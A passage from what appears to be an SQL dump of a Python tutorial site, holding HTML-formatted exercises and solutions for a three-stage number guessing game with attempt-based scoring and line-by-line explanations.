10</span></div><div><span style=\"color: #ce9178;\">    #secret number generation</span></div><div><span style=\"color: #ce9178;\">    secret_number = randint(1,end_value)</span></div><div><span style=\"color: #ce9178;\">    #looping statment for 5 attempts at each stage</span></div><div><span style=\"color: #ce9178;\">    for counter in range(0,5):</span></div><div><span style=\"color: #ce9178;\">        #gets the guessing number as user input</span></div><div><span style=\"color: #ce9178;\">        guess_number = int(input(\"Guess the secret number between 1 and {} ({} attempts left):\".format(end_value,5-counter)))</span></div><div><span style=\"color: #ce9178;\">        #check guessing number is correct or higher or lower</span></div><div><span style=\"color: #ce9178;\">        if secret_number == guess_number:</span></div><div><span style=\"color: #ce9178;\">            print(\"Your Guess is Correct, You Won the level {}\".format(level))</span></div><div><span style=\"color: #ce9178;\">            level = level + 1</span></div><div><span style=\"color: #ce9178;\">            break</span></div><div><span style=\"color: #ce9178;\">        elif guess_number &lt; secret_number:</span></div><div><span style=\"color: #ce9178;\">            print(\"Your Guess is lower than secret number\")</span></div><div><span style=\"color: #ce9178;\">        else:</span></div><div><span style=\"color: #ce9178;\">            print(\"Your Guess is higher than secret number\")</span></div><div><span style=\"color: #ce9178;\">    else: #else of for statement</span></div><div><span style=\"color: #ce9178;\">        print(\"Game Over, You Loose the Game, secret number is {}\".format(secret_number))</span></div><div><span style=\"color: #ce9178;\">        break</span></div><div><span style=\"color: #ce9178;\">else: #else of while statement</span></div><div><span style=\"color: #ce9178;\">    print(\"Congratz, You Won the Game!!!\")</span></div></div>',NULL,'<p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 3: Imports the randint function from the package random</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Line 5: initiate level or stage as 1&nbsp;</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 7: while loop for three stages</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 11 :&nbsp;<span style=\"font-size: 1.125rem;\">using randint system generates a secret number</span></p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 13 : looping statement to allow user 5 attempts</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 15 : getting guessing number from user as input</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 17 :&nbsp;<span style=\"font-size: 1.125rem;\">check whether secret number generated by system and guessing number entered by user are same</span></p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 18 : if same, display \"your guess is correct\"</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 19 : increase the stage or level by 1, so it moves to next stage</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 20 : breaks the current level (stage) and moves to next</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\"><span style=\"font-size: 1.125rem;\">line 21 : if not same, check whether&nbsp; guessing number entered by user is less than secret number generated by system</span><br></p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 22 : if lower, display your guess is lower than the secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 24 : if not, display your guess is higher than the secret number</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 25 : else statement of for statement (python only having this when compare to C, C++ and java)</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 26 : executes after all the iterations of for (note : break statement doesn\'t allow to run else statement of for which means you guessed correctly this else will not work)</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">line 28 : else of while statement, executes if all three levels successfully completed.&nbsp;</p><p style=\"margin-bottom: 1rem; font-size: 1.125rem; line-height: 1.6; color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;;\">Note (For is suitable for know number of iterations and while is suitable condition based iteration. example in inner loop for attempts we know 5 iterations needed. but in outer for loop it has to execute till level reaches 4, it may need any number of iteration based on user play)</p>',27,NULL,NULL,NULL),(1067,'Multi Stage Guessing Game with Scoring Feature in Python','guessing-game-in-python-level-5','<div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">\"Multi Stage Guessing Game and Points\"</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">Create a three stage guessing game with point scoring in each stage the user must guess the secret number in five attempts. Range of Secret number should be increased at stage like 1 to 10 in stage in 1, 1 to 20 in stage 2 and 1 to 30 in stage 3. If the user correctly guessed the secret number, the system should display \"your guess is correct\" and moves to next stage; otherwise, it should tell the user whether the guessed number is higher or lower than the secret number and proceed to the next attempt. If the user fails to guess correctly after five attempts, the game should end with the message \"Game Over, You Lose the Game.\" If user successfully&nbsp;guessed in all the three stages, display \"You won the Game with scored points\" and stops the game.</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">At each stage the points will be awarded to user based on following condition</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><table class=\"table table-bordered\"><tbody><tr><td>Solved in&nbsp;</td><td>points</td></tr><tr><td>first attempt</td><td>100</td></tr><tr><td>second attempt</td><td>75</td></tr><tr><td>third attempt</td><td>50</td></tr><tr><td>fourth attempt</td><td>25</td></tr><tr><td>fifth attempt</td><td>10</td></tr></tbody></table><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Hint : Sequence Type (list) is needed for this.</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Objective : To learn the declaration and usage of list.</div>','B','<div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; line-height: 19px; white-space: pre;\"><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#hashed lines are comment lines used to illustrate the program</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#import the built in method randint to generate an automatic secret number</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">from random import randint</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\"># intiate level or stage as 1 </span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">level = 1</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#sequence type to store points</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">points = [100,75,50,25,10]</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#initial score is zeero</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">points_scored = 0</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">#loop for 3stages</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">while level &lt;= 3:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #complexity range for each stage</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    end_value = level * 10</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #secret number generation</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    secret_number = randint(1,end_value)</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    #looping statment for 5 attempts at each stage</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    for counter in range(0,5):</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        #gets the guessing number as user input</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        guess_number = int(input(\"Guess the secret number between 1 and {} ({} attempts left):\".format(end_value,5-counter)))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        #check guessing number is correct or higher or lower</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        if secret_number == guess_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is Correct, You Won the level {} with {} points\".format(level,points[counter]))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            points_scored += points[counter]</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            level = level + 1</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            break</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        elif guess_number &lt; secret_number:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is lower than secret number\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        else:</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is higher than secret number\")</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    else:#else of for statement</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        print(\"Game Over, You Loose the Game, secret number is {}\".format(secret_number))</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">        break</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">else:#else of while statement</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\">    print(\"Congratz, You Won the Game with {} !!!\".format(points_scored)) </span></div></div>',NULL,'<p>Logic is same as<a href=\"https://www.decodeschool.com/python-logic-building/python-program-for-guessing-game/guessing-game-in-python-level-4\" target=\"_blank\"> previous level,</a> in addition to that&nbsp;</p><p>in line 10 a list is maintained with points for each number of attempt,</p><p>in line 23 we are adding the score from points based on number of attempts (counter variable)&nbsp;</p><p>finally displaying the total score.</p>',27,NULL,NULL,NULL),(1068,'Multi Stage Guessing Game with Scoring Board','guessing-game-in-python-level-6','<div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">\"Multi Stage Guessing Game and Points of every stage\"</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">Create a three stage guessing game with point scoring in each stage the user must guess the secret number in five attempts. Range of Secret number should be increased at stage like 1 to 10 in stage in 1, 1 to 20 in stage 2 and 1 to 30 in stage 3. If the user correctly guessed the secret number, the system should display \"your guess is correct\" and moves to next stage; otherwise, it should tell the user whether the guessed number is higher or lower than the secret number and proceed to the next attempt. If the user fails to guess correctly after five attempts, the game should end with the message \"Game Over, You Lose the Game.\" If user successfully&nbsp;guessed in all the three stages, display \"You won the Game with scored points\", then points scored at each level and stops the game.</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\">At each stage the points will be awarded to user based on following condition</font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><table class=\"table table-bordered\" style=\"width: 681px; margin-bottom: 1rem; color: rgb(41, 41, 41); border-color: rgb(169, 169, 169); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px; background-color: rgb(255, 255, 255);\"><tbody><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">Solved in&nbsp;</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">points</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">first attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">100</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">second attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">75</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">third attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">50</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">fourth attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">25</td></tr><tr><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">fifth attempt</td><td style=\"padding: 0.75rem; border-color: rgb(169, 169, 169);\">10</td></tr></tbody></table><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\"><font color=\"#4f4f4f\" face=\"-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji\"><br></font></div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Hint : Sequence Type (list) is needed for this.</div><div style=\"color: rgb(79, 79, 79); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px;\">Objective : To learn the declaration and usage of list.</div>','B','<div style=\"line-height: 19px;\"><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">#hashed lines are comment lines used to illustrate the program</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">#import the built in method randint to generate an automatic secret number</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">from random import randint</span></div><div style=\"\"><font face=\"Consolas, Courier New, monospace\"><span style=\"white-space: pre; background-color: rgb(255, 255, 255);\"># initiate level or stage as 1 </span></font></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">level = 1</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">#sequence type to store points</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">points = [100,75,50,25,10]</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">#sequence type to store points scored at each level</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">points_scored = list()</span></div><div style=\"\"><span style=\"background-color: rgb(255, 255, 255);\"><span style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\">#loop for </span><font face=\"Consolas, Courier New, monospace\"><span style=\"white-space: pre;\">3 stages</span></font></span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">while level &lt;= 3:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    #complexity range for each stage</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    end_value = level * 10</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    #secret number generation</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    secret_number = randint(1,end_value)</span></div><div style=\"\"><font face=\"Consolas, Courier New, monospace\"><span style=\"white-space: pre; background-color: rgb(255, 255, 255);\">    #looping statement for 5 attempts at each stage</span></font></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">    for counter in range(0,5):</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        #gets the guessing number as user input</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        guess_number = int(input(\"Guess the secret number between 1 and {} ({} attempts left):\".format(end_value,5-counter)))</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        #check guessing number is correct or higher or lower</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">        if secret_number == guess_number:</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            print(\"Your Guess is Correct, You Won the level {} with {} points\".format(level,points[counter]))</span></div><div style=\"font-family: Consolas, &quot;Courier New&quot;, monospace; white-space: pre;\"><span style=\"background-color: rgb(255, 255, 255);\">            